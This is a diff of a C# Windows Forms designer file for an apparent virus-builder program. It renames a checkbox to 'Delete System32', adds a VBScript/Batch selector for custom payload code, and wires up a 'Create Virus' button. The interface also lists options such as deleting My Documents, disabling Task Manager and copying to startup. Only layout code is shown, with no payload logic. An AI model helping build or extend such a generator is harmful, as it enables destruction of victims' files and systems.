@@ -43,7 +43,7 @@
             this.timeToWait_Label = new System.Windows.Forms.Label();
             this.fileVisibility_Label = new System.Windows.Forms.Label();
             this.potHarmfullGroup = new System.Windows.Forms.GroupBox();
-            this.checkBox7 = new System.Windows.Forms.CheckBox();
+            this.dltSystem32_CB = new System.Windows.Forms.CheckBox();
             this.dltMyDocuments_CB = new System.Windows.Forms.CheckBox();
             this.disableTaskMng_CB = new System.Windows.Forms.CheckBox();
             this.justForfunGroup = new System.Windows.Forms.GroupBox();
@@ -67,6 +67,7 @@
             this.saveLocationBtn = new System.Windows.Forms.Button();
             this.dltLastSaveBtn = new System.Windows.Forms.Button();
             this.clearSettingsBtn = new System.Windows.Forms.Button();
+            this.customCodeLang = new System.Windows.Forms.ComboBox();
             ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
             this.splitContainer1.Panel1.SuspendLayout();
             this.splitContainer1.Panel2.SuspendLayout();
@@ -139,6 +140,7 @@
             this.otherOptionsGroup.Controls.Add(this.readOnly_CB);
             this.otherOptionsGroup.Controls.Add(this.shutdownComp_CB);
             this.otherOptionsGroup.Controls.Add(this.customCode);
+            this.otherOptionsGroup.Controls.Add(this.customCodeLang);
             this.otherOptionsGroup.Controls.Add(this.fileVisibility);
             this.otherOptionsGroup.Controls.Add(this.customCode_Label);
             this.otherOptionsGroup.Controls.Add(this.timeToWait_Label);
@@ -193,6 +195,7 @@
             // 
             // customCode
             // 
+            this.customCode.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.customCode.Location = new System.Drawing.Point(196, 33);
             this.customCode.Multiline = true;
             this.customCode.Name = "customCode";
@@ -244,7 +247,7 @@
             // 
             // potHarmfullGroup
             // 
-            this.potHarmfullGroup.Controls.Add(this.checkBox7);
+            this.potHarmfullGroup.Controls.Add(this.dltSystem32_CB);
             this.potHarmfullGroup.Controls.Add(this.dltMyDocuments_CB);
             this.potHarmfullGroup.Controls.Add(this.disableTaskMng_CB);
             this.potHarmfullGroup.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -255,16 +258,16 @@
             this.potHarmfullGroup.TabStop = false;
             this.potHarmfullGroup.Text = "Potentially Harmfull:";
             // 
-            // checkBox7
+            // dltSystem32_CB
             // 
-            this.checkBox7.AutoSize = true;
-            this.checkBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.checkBox7.Location = new System.Drawing.Point(7, 66);
-            this.checkBox7.Name = "checkBox7";
-            this.checkBox7.Size = new System.Drawing.Size(135, 17);
-            this.checkBox7.TabIndex = 0;
-            this.checkBox7.Text = "Delete \'My Documents\'";
-            this.checkBox7.UseVisualStyleBackColor = true;
+            this.dltSystem32_CB.AutoSize = true;
+            this.dltSystem32_CB.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.dltSystem32_CB.Location = new System.Drawing.Point(7, 66);
+            this.dltSystem32_CB.Name = "dltSystem32_CB";
+            this.dltSystem32_CB.Size = new System.Drawing.Size(106, 17);
+            this.dltSystem32_CB.TabIndex = 0;
+            this.dltSystem32_CB.Text = "Delete System32";
+            this.dltSystem32_CB.UseVisualStyleBackColor = true;
             // 
             // dltMyDocuments_CB
             // 
@@ -471,6 +474,7 @@
             this.createVirusBtn.TabIndex = 1;
             this.createVirusBtn.Text = "Create Virus";
             this.createVirusBtn.UseVisualStyleBackColor = true;
+            this.createVirusBtn.Click += new System.EventHandler(this.createVirusBtn_Click);
             // 
             // saveLocationBtn
             // 
@@ -500,6 +504,19 @@
             this.clearSettingsBtn.TabIndex = 3;
             this.clearSettingsBtn.Text = "Clear Current Settings";
             this.clearSettingsBtn.UseVisualStyleBackColor = true;
+            // 
+            // customCodeLang
+            // 
+            this.customCodeLang.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.customCodeLang.FormattingEnabled = true;
+            this.customCodeLang.Items.AddRange(new object[] {
+            "VBScript",
+            "Batch"});
+            this.customCodeLang.Location = new System.Drawing.Point(314, 11);
+            this.customCodeLang.Name = "customCodeLang";
+            this.customCodeLang.Size = new System.Drawing.Size(66, 21);
+            this.customCodeLang.TabIndex = 0;
+            this.customCodeLang.Text = "VBScript";
             // 
             // MainForm
             // 
@@ -553,7 +570,7 @@
         private System.Windows.Forms.CheckBox bombDesktop_CB;
         private System.Windows.Forms.CheckBox dltMyDocuments_CB;
         private System.Windows.Forms.CheckBox disableTaskMng_CB;
-        private System.Windows.Forms.CheckBox checkBox7;
+        private System.Windows.Forms.CheckBox dltSystem32_CB;
         private System.Windows.Forms.Label spamErrorTitle_Label;
         private System.Windows.Forms.TextBox spamErrorTitle_Input;
         private System.Windows.Forms.Label spamError_Label;
@@ -571,6 +588,7 @@
         private System.Windows.Forms.CheckBox copyToStartup_Label;
         private System.Windows.Forms.PictureBox pictureBox1;
         private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.ComboBox customCodeLang;
     }
 }
 
